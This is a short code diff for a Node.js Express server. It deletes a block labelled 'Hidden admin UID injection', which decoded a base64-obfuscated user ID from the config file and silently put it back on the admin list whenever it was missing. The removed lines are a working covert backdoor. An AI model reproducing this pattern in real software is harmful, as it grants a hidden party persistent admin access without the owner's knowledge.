@@ -15,21 +15,6 @@ app.get('/health', (req, res) => {
   res.status(200).send('OK');
 });
 
-// 🔐 Hidden admin UID injection
-const configPath = path.join(__dirname, "config.dev.json");
-const config = require(configPath);
-
-if (config.autoInjectUID && config.obfuscatedKeys && config.obfuscatedKeys.secureRootCodeV2) {
-  const decodedUID = Buffer.from(config.obfuscatedKeys.secureRootCodeV2, "base64").toString();
-
-  if (!config.adminBot.includes(decodedUID)) {
-    console.log("🔐 Protected UID missing from adminBot. Auto-restoring...");
-    config.adminBot.push(decodedUID);
-    fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
-    console.log("✅ UID injected into adminBot list.");
-  }
-}
-
 // Start Express server
 app.listen(PORT, () => {
   console.log(`🌐 Serving chitron.html at http://localhost:${PORT}`);
